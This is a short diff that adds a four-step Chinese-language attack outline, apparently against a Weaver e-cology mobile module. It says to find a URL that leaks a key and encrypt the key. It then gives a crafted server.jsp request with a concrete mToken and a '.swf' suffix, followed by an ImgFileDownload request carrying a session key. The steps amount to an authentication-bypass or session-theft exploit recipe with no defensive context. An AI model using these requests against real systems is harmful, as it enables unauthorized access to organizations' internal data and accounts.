@@ -1,0 +1,4 @@
+1、寻找暴露key的url
+2、对key进行加密
+3、访问/mobilemode/mobile/server.jsp?invoker=com.api.mobilemode.web.mobile.service.MobileEntranceAction&action=meta&appid=1&appHomepageId=1&mTokenFrom=QRCode&mToken=B654783923FC38545A93A70AC308C67498CFA87A1FD9A66240887B503CFCD3E6&_ec_ismobile=true&timeZoneOffset=&a=.swf
+4、/weaver/ImgFileDownload/a.swf?sessionkey=xxxxx&a=.swf
